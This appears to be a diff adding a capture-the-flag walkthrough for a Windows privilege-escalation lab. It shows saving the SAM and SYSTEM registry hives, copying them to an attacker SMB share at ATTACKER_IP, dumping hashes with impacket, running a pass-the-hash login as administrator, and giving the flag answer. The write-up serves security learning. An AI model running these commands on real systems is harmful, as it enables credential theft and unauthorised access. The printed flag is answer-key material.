@@ -269,3 +269,41 @@ These privileges represent common opportunities for attackers to escalate their 
 In this task, we can decide between three different methods: SeBackup / SeRestore, SeTakeOwnership, SeImpersonate / SeAssignPrimaryToken. I will pick the Backup route as it seems to involve of a few techniques I find great to learn.
 RDP into the target machine, for example by using `Remmina` on your **AttackBox**. When logged in you can go ahead and run a command prompt **as administrator**.
 You should now be able to see your privileges with the command: `whoami /priv`
+![Checking our privileges](images/checking_privilege.png)
+
+Bypass traverse checking allows to backup SAM and SYSTEM hashes with the following commands:
+```
+reg save hklm\system C:\Users\THMBackup\system.hive
+reg save hklm\sam C:\Users\THMBackup\sam.hive
+```
+Make sure the backups are in the directory:
+
+![Checking if the backup hive files are saved](images/cjecking_hivefiles.png)
+
+Now we need to get it over to your **AttackBox**. We can do by using SMB. We can use impacket’s `smbserver.py` to start a simple SMB server with a network share in the current directory of our AttackBox.
+```
+mkdir share
+python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
+```
+
+Now run the following commands to copy the backups from windows to our **Attackbox**.
+```
+copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+```
+We can now use impacket to retrieve the users’ password hashes:
+```
+cd share
+python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+```
+![Dumping password hashes with impacket](images/Dumping_password_hashes.png)
+Finally, we can do a Pass-the-Hash attack by passing the Administrator hash in the following command (please use the correct hash if it does not fit your results):
+```
+python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f81ee5558e2d1205a84d07b0e3b34f5 administrator@Lab_IP
+```
+![Using a Pass-the-hash attack](images/pass_the_hash_attack.png)
+Now we only need to find the flag on the Administrator’s Desktop:
+![flag](images/administrator_flag.png)
+#### Answer: THM{SEFLAGPRIVILEGE}
+
+## Task 7: Abusing vulnerable software
